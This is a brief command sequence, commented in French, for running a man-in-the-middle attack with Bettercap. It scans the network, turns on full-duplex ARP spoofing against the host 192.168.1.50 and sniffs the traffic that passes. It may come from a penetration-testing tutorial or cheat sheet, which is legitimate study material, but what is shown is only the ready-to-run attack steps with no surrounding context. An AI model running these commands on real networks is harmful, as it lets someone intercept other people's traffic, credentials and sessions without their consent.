# 1. Lancer Bettercap et scanner le réseau
sudo bettercap -iface eth0
bettercap> net.probe on

# 2. Démarrer l'attaque MITM
bettercap> set arp.spoof.fullduplex true
bettercap> set arp.spoof.targets 192.168.1.50
bettercap> arp.spoof on

# 3. Sniffer le trafic
bettercap> net.sniff on